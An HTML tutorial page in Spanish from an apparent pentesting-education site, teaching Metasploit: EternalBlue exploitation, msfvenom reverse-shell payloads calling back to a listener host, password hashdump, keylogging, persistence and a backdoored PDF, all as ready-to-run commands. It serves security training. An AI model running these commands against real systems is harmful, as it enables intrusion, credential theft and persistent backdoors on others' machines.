@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Metasploit Framework | HackEnvironment</title>
+    <link rel="stylesheet" href="../../assets/css/main.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <meta name="description" content="Guía definitiva para usar Metasploit Framework: explotación de vulnerabilidades, post-explotación y generación de payloads.">
+</head>
+<body>
+    <!-- Barra de navegación -->
+    <nav class="main-nav">
+        <div class="nav-container">
+            <a href="../../index.html" class="brand-logo">
+                <img src="../../assets/img/logos/hackenvironment-logo.png" alt="HackEnvironment Logo">
+                <span>HackEnvironment</span>
+            </a>
+            <div class="mobile-menu-toggle" id="mobileMenuToggle">
+                <i class="fas fa-bars"></i>
+            </div>
+            <ul class="nav-menu" id="navMenu">
+                <li><a href="../../index.html"><i class="fas fa-home"></i> Inicio</a></li>
+                <li class="dropdown">
+                    <a href="#"><i class="fas fa-tools"></i> Herramientas <i class="fas fa-chevron-down"></i></a>
+                    <ul class="dropdown-menu">
+                        <li><a href="nmap.html">Nmap</a></li>
+                        <li><a href="wireshark.html">Wireshark</a></li>
+                        <li><a href="metasploit.html" class="active">Metasploit</a></li>
+                        <li><a href="kali.html">Kali Linux</a></li>
+                    </ul>
+                </li>
+                <li><a href="../guias/pentesting.html"><i class="fas fa-book"></i> Guías</a></li>
+            </ul>
+            <div class="theme-toggle" id="themeToggle">
+                <i class="fas fa-moon"></i>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Encabezado -->
+    <header class="hero-subpage">
+        <div class="hero-overlay"></div>
+        <div class="hero-content">
+            <h1><i class="fas fa-bomb"></i> Metasploit Framework</h1>
+            <p class="subtitle">Framework líder para desarrollo y ejecución de exploits</p>
+        </div>
+    </header>
+
+    <!-- Contenido principal -->
+    <main class="container">
+        <!-- Introducción -->
+        <section class="section">
+            <div class="intro-with-image">
+                <div>
+                    <h2><i class="fas fa-info-circle"></i> ¿Qué es Metasploit?</h2>
+                    <p>Metasploit es un <strong>framework de pentesting</strong> que permite:</p>
+                    <ul>
+                        <li><i class="fas fa-check"></i> Desarrollar y ejecutar exploits contra objetivos</li>
+                        <li><i class="fas fa-check"></i> Crear payloads personalizados</li>
+                        <li><i class="fas fa-check"></i> Realizar post-explotación avanzada</li>
+                    </ul>
+                    <div class="download-box">
+                        <a href="https://www.metasploit.com/download" class="btn btn-primary" target="_blank">
+                            <i class="fas fa-download"></i> Descargar Metasploit
+                        </a>
+                        <span>Versión actual: Metasploit 6.3</span>
+                    </div>
+                </div>
+                <img src="../../assets/img/screenshots/msfconsole.png" alt="Interfaz de msfconsole">
+            </div>
+        </section>
+
+        <!-- Instalación -->
+        <section class="section">
+            <h2><i class="fas fa-download"></i> Instalación y Configuración</h2>
+            
+            <div class="installation-steps">
+                <div class="step">
+                    <h3><i class="fab fa-linux"></i> En Kali Linux</h3>
+                    <pre><code class="language-bash">sudo apt update && sudo apt install metasploit-framework
+sudo systemctl start postgresql
+msfdb init</code></pre>
+                </div>
+                
+                <div class="step">
+                    <h3><i class="fab fa-windows"></i> En Windows</h3>
+                    <ol>
+                        <li>Descargar instalador desde <a href="https://www.metasploit.com/download" target="_blank">metasploit.com</a></li>
+                        <li>Ejecutar el instalador como administrador</li>
+                        <li>Iniciar desde: <code>Start Menu > Metasploit Framework</code></li>
+                    </ol>
+                </div>
+            </div>
+            
+            <div class="alert alert-info">
+                <i class="fas fa-info-circle"></i>
+                <strong>Nota:</strong> En Kali Linux, Metasploit viene preinstalado pero requiere iniciar PostgreSQL.
+            </div>
+        </section>
+
+        <!-- Uso Básico -->
+        <section class="section">
+            <h2><i class="fas fa-terminal"></i> Uso Básico de msfconsole</h2>
+            
+            <div class="command-grid">
+                <div class="command-card">
+                    <h3>1. Búsqueda de Exploits</h3>
+                    <pre><code class="language-bash">msf6 > search eternalblue
+msf6 > search type:exploit platform:windows</code></pre>
+                </div>
+                
+                <div class="command-card">
+                    <h3>2. Configurar un Exploit</h3>
+                    <pre><code class="language-bash">msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit > set RHOSTS 192.168.1.100
+msf6 exploit > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 exploit > set LHOST 192.168.1.50
+msf6 exploit > show options</code></pre>
+                </div>
+                
+                <div class="command-card">
+                    <h3>3. Ejecución y Post-Explotación</h3>
+                    <pre><code class="language-bash">msf6 exploit > exploit
+[*] Meterpreter session 1 opened
+
+meterpreter > sysinfo
+meterpreter > getuid
+meterpreter > hashdump</code></pre>
+                </div>
+            </div>
+        </section>
+
+        <!-- Generación de Payloads -->
+        <section class="section">
+            <h2><i class="fas fa-code"></i> Generación de Payloads</h2>
+            
+            <div class="payload-types">
+                <div class="payload-card">
+                    <h3><i class="fab fa-windows"></i> Windows</h3>
+                    <pre><code class="language-bash">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe</code></pre>
+                </div>
+                
+                <div class="payload-card">
+                    <h3><i class="fab fa-linux"></i> Linux</h3>
+                    <pre><code class="language-bash">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o payload.elf</code></pre>
+                </div>
+                
+                <div class="payload-card">
+                    <h3><i class="fas fa-globe"></i> Web</h3>
+                    <pre><code class="language-bash">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o payload.php</code></pre>
+                </div>
+            </div>
+            
+            <h3>Listener Config</h3>
+            <pre><code class="language-bash">msf6 > use exploit/multi/handler
+msf6 exploit > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 exploit > set LHOST 192.168.1.50
+msf6 exploit > set LPORT 4444
+msf6 exploit > exploit -j</code></pre>
+        </section>
+
+        <!-- Post-Explotación -->
+        <section class="section">
+            <h2><i class="fas fa-user-secret"></i> Comandos de Post-Explotación</h2>
+            
+            <div class="table-responsive">
+                <table class="post-exploit-table">
+                    <thead>
+                        <tr>
+                            <th>Comando</th>
+                            <th>Descripción</th>
+                            <th>Ejemplo</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><code>migrate</code></td>
+                            <td>Cambiar a otro proceso</td>
+                            <td><code>migrate 1234</code></td>
+                        </tr>
+                        <tr>
+                            <td><code>getsystem</code></td>
+                            <td>Escalar privilegios</td>
+                            <td><code>getsystem</code></td>
+                        </tr>
+                        <tr>
+                            <td><code>download</code></td>
+                            <td>Descargar archivos</td>
+                            <td><code>download C:\\secret.txt</code></td>
+                        </tr>
+                        <tr>
+                            <td><code>keyscan_start</code></td>
+                            <td>Keylogger</td>
+                            <td><code>keyscan_start</code></td>
+                        </tr>
+                        <tr>
+                            <td><code>screenshot</code></td>
+                            <td>Capturar pantalla</td>
+                            <td><code>screenshot</code></td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+
+        <!-- Escenarios Prácticos -->
+        <section class="section">
+            <h2><i class="fas fa-flask"></i> Escenarios Prácticos</h2>
+            
+            <div class="scenario-accordion">
+                <div class="accordion-item">
+                    <button class="accordion-btn">
+                        <i class="fas fa-laptop"></i> Explotación de EternalBlue (MS17-010)
+                    </button>
+                    <div class="accordion-content">
+                        <pre><code class="language-bash">msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit > set RHOSTS 192.168.1.100
+msf6 exploit > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 exploit > set LHOST 192.168.1.50
+msf6 exploit > exploit
+
+# Post-explotación
+meterpreter > getuid
+meterpreter > hashdump
+meterpreter > persist -X -i 30 -p 443 -r 192.168.1.50</code></pre>
+                    </div>
+                </div>
+                
+                <div class="accordion-item">
+                    <button class="accordion-btn">
+                        <i class="fas fa-file-alt"></i> Crear backdoor en documento PDF
+                    </button>
+                    <div class="accordion-content">
+                        <pre><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f pdf -o documento.pdf</code></pre>
+                        <p>El PDF abrirá un documento legítimo mientras ejecuta el payload en segundo plano.</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="alert alert-warning">
+                <i class="fas fa-exclamation-triangle"></i>
+                <strong>Importante:</strong> Solo usar estas técnicas en sistemas con permiso explícito.
+            </div>
+        </section>
+    </main>
+
+    <!-- Footer -->
+    <footer class="main-footer">
+        <div class="container">
+            <div class="footer-logo">
+                <img src="../../assets/img/logos/hackenvironment-logo-white.png" alt="HackEnvironment Logo">
+                <span>HackEnvironment</span>
+            </div>
+            <p class="footer-disclaimer">Este contenido es solo para fines educativos en entornos controlados.</p>
+        </div>
+    </footer>
+
+    <!-- Scripts -->
+    <script src="../../assets/js/app.js"></script>
+    <script>
+        // Acordeón interactivo
+        document.querySelectorAll('.accordion-btn').forEach(btn => {
+            btn.addEventListener('click', () => {
+                const content = btn.nextElementSibling;
+                content.style.display = content.style.display === 'block' ? 'none' : 'block';
+            });
+        });
+    </script>
+</body>
+</html>
